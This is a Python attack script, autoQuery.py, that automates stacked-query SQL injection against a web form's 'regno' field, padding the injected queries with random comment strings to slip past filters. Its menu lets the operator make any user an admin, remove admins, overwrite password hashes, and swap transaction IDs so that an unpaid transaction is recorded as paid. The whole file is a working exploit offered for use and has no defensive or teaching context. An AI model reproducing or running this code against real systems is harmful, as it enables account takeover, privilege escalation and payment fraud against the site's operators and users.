#codeName: autoQuery.py
#Author: Dahir Muhammad Dahir
#Date: 19th-November-2018
#About: script for automatically issuing queries to target vulnerable
#       to sql Injection and supporting stacked queries

import os
import re
import requests
from time import ctime as current_time
from random import sample
from string import digits, ascii_lowercase as lowercase

headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) \
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"}

thisDir = os.getcwd() # var for current working dir
charcters = lowercase+digits
shell_char = "\n\nroot@dmd:~# "

rand_string_pattern = re.compile(r"/\*.{6}\*/")


def main():
    task = input("what would you like to do:\n[1]=> make admin\n[2]=> swap txnid and set paid\n[3]=> remove admin\n[4]=> change password\n[5]=> change hash%s"%(shell_char))
    if task == "1":
        make_admin()
    elif task == "2":
        swap_txn_id()
    elif task == "3":
        remove_admin()
    elif task == "4":
        change_password()
    elif task == "5":
        change_hash()
    else:
        print("Invalid input!...please check your input...")


def make_admin():
    username = input("\nEnter username to make admin%s"%(shell_char))
    make_admin_query = "UPDATE tblusers SET enable='y', usergroupid='1' where username='{}'".replace(' ', get_rand_string()).format(username)
    if queryDB(make_admin_query):
        print("{} was made admin...".format(username))


def swap_txn_id():
    paid_txn_id = input("\nEnter the paid transaction id%s"%(shell_char))
    unpaid_txn_id = input("\nEnter the unpaid transaction id%s"%(shell_char))
    date_gen = input("\nEnter date txn_id was generated%s"%(shell_char))
    date_paid = input("\nEnter date txn_id was paid%s"%(shell_char))
    rrr = input("\nEnter the rrr%s"%(shell_char))
    teller_no = "000000"
    payment_status = "Paid"
    dummy_txn_id = "666611118888"
    set_paid_id_2_dummy_query = "UPDATE tbltransaction SET transcode={} where transcode={}".replace(' ', get_rand_string()).format(dummy_txn_id, paid_txn_id)
    if queryDB(set_paid_id_2_dummy_query):
        print("Successfully changed paid txn_id to dummy txn_id")
        set_unpaid_id_to_paid_query = "UPDATE tbltransaction SET transcode={} where transcode={}".replace(' ', get_rand_string()).format(paid_txn_id, unpaid_txn_id)
        if queryDB(set_unpaid_id_to_paid_query):
            print("updated unpaid txn_id to paid txn_id")
            set_paid_id_2_unpaid_query = "UPDATE tbltransaction SET transcode={} where transcode={}".replace(' ', get_rand_string()).format(unpaid_txn_id, dummy_txn_id)
            if queryDB(set_paid_id_2_unpaid_query):
                print("updated paid txn_id to unpaid txn_id and removed dummy txn_id")
                update_fields_query = "UPDATE tbltransaction SET paymentstatus={}, dategen={}, datepaid={}, tellerno={}, rrr={} where transcode={}".replace(' ', get_rand_string()).format(payment_status, date_gen, date_paid, teller_no, rrr, paid_txn_id)
                if queryDB(update_fields_query):
                    print("Swap completed succesfully")
                else:
                    print("print something happen during the final swap unable to complete")
            else:
                print("unable to set paid_id to unpaid please check your queries")
        else:
            print("unable to set unpaid_id to paid the paid txn_id")
    else:
        print("unable to set paid txn_id to dummy txn_id please check queries")


def remove_admin():
    username = input("\nEnter username to make admin%s"%(shell_char))
    remove_admin_query = "UPDATE tblusers SET enable='n', usergroupid='4' where username='{}'".replace(' ', get_rand_string()).format(username)
    if queryDB(remove_admin_query):
        print("{} was removed from admin....".format(username))


def change_password():
    username = input("\nEnter username to make admin%s"%(shell_char))
    password = input("\nEnter the new password you want to set%s"%(shell_char))
    make_admin_query = "UPDATE tblusers SET pwd=password('{}') where username='{}'".replace(' ', get_rand_string()).format(password, username)
    if queryDB(make_admin_query):
        print("print password was successfully set to {}".format(password))

def change_hash():
    username = input("\nEnter username to make admin%s"%(shell_char))
    password_hash = input("\nEnter the new password hash you want to set%s"%(shell_char))
    make_admin_query = "UPDATE tblusers SET pwd={} where username='{}'".replace(' ', get_rand_string()).format(password_hash, username)
    if queryDB(make_admin_query):
        print("print password was successfully set to {}".format(password_hash))


# generate and return a random string in the format /*random_string*/
def get_rand_string():
    rand_string = sample(charcters, 6)
    return '/*'+"".join(rand_string)+'*/'


def queryDB(query):
    complete_query = ("' OR 1=1; %s -- a"%(query))
    data = {"regno":complete_query, "submit":"Submit"}
    targetAdrress = ""
    with requests.Session() as s:
        sent_query = s.post(targetAdrress, data=data, headers=headers)
        if sent_query.status_code == 200:
            # using re to remove the random pattern we inserted b4 writing to file
            writeQuery(re.sub(rand_string_pattern, ' ', query))
            return True
        else:
            return False


def writeQuery(query):
    with open(thisDir+"/queriesHistory.dmd", "a") as f:
        f.write('[' + current_time + ']' + query +"\n")


if __name__=="__main__":
    main()
